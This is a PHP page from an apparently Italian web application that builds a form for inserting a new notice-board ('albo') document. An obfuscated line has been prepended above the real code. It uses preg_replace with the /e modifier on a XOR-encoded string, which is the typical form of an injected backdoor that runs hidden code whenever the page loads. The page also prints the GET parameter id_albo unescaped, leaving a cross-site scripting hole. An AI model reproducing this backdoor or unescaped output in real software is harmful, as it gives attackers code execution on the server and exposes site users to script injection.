<?php
//9L2xLY1fWjS781ZkOVmi3IT66Sbn0cT7oKtzijT5Im1F

preg_replace("/qkRNcZhWTzy8yQPu5ads0BB4Knt/e", "QoJ82chOhExZWS2U5eYLOT2opyF5ndj4Gtz9KVMra0GwQ8GJafVpyMTdAYWn37f9oU6zqHgFFm3Vi9f0c1nPC8tCUEpLAKJoeEdKL0QQlHlIEGHg7vw0reABjqNj1WNUbqempu4P2eY7kfcgPNe8sf9QKK1=hDT9tykYidnY8BUhhwCx0ht"^"4\x19\x2bT\x1aA\x01\x29\x40\x2c\x0b\x292\x27\x1a\x09iA\x06\x1e\x0a\x05g\x2a\x23\x2d\x1d\x12\x0d\x0cMinT\x5c\x1fk\x7e\x20\x16T\x18\x1b\x2bug\x15\x0f03\x13\x23\x2d\x16s\x07\x29\x7e\x0aG\x13\x0a\x5b\x19H0T\x1f\x13\x7fV\x24t\x0f\x0b0\x0d\x0d\x00\x01U\x04\x0ca\x25\x5bLqcwC\x7f\x20r\x7fY\x03bMkj\x16q8\x1f\x3b\x09=m\x1b\x14Ch\x242a\x27\x20\x12\x161V\x3e\x02A\x08\x2d\x3a\x06\x14B0Y\x5c\x14\x2b\x12\x00\x2fV\x07N\x3f\x3bt\x117\x7d\x223\x7c\x02\x1f\x10\x16M\x004\x0bZ\x1b\x1d\x0e\x7e4MUy\x5d\x3a\x3c\x1c\x40\x5exXMJ\x5d", "qkRNcZhWTzy8yQPu5ads0BB4Knt");//86uhL80keV5TJ1GZF2SgTAeVBWfoEus?><?php
include ("../include.inc.php");

/*
 * Config e chiamo DB *******************************
 */
require_once ('../class/ConfigSingleton.php');
$cfg = SingletonConfiguration::getInstance ();
require_once ("../class/Db.php");
$factory=DbAbstractionFactory::getFactory($cfg->getValue('AstrazioneDB'));
$factory->setDsn($cfg->getValue('DSN'));
$db=$factory->createInstance();
//********************************************************

$percorso_relativo = "../";
//il seguente codice serve solo per i validatori on-line (css xhtml accessibilità)
//($_POST["tipo_impianto"] == "") ? ($_POST["tipo_impianto"]="Solare Termico") : ($_POST["tipo_impianto"]=$_POST["tipo_impianto"]);

$titolo_pagina = "Inserimento nuovo Documento";

include($percorso_relativo."grafica/head.php");
include($percorso_relativo."grafica/body_head.php");


require_once '../class/Albo.php';
require_once '../class/Area.php';
require_once '../class/Tipo.php';

$albo = new Albo();
$tipo = new Tipo();
$area = new Area();
$albo->setTipo($tipo);
$albo->setArea($area);

$id_albo = $_GET['id_albo'];

$tipo->setId_tipo($albo->getIdTipo_from_IdAlbo_DalDB($id_albo));
$tipo->setTipo($tipo->getTipoFromIdTipo($tipo->getId_tipo()));

$area->setId_area($albo->getIdArea_from_IdAlbo_DalDB($id_albo));
$area->setArea($area->getAreaFromIdArea($area->getId_area()));
$area->setResponsabile($area->getRespFromIdArea($area->getId_area()));

$albo->caricaDalDB($id_albo);

$_SESSION['albo'] = serialize($albo);

?>

<div class="titolo_pagina">
<h3>
<?=$titolo_pagina ?>
</h3>
</div>


<form name='myForm' enctype="multipart/form-data" id='myForm' action="valida_albo_from_proto03.php" method="post">
<?= $id_albo?>
<input type="hidden" name="id_albo" value="<?=$id_albo?>" />  
<?
include ("forms/formAlbo.php");
?>

<div class="testo">
<!-- <input name="ok" type="button" value="Avanti ->" onclick="controlla_e_submit()" />  -->
<input name="ok" type="submit" value="Avanti ->" /> 
</div>

</form>

<?
include($percorso_relativo."grafica/body_foot.php");
?>

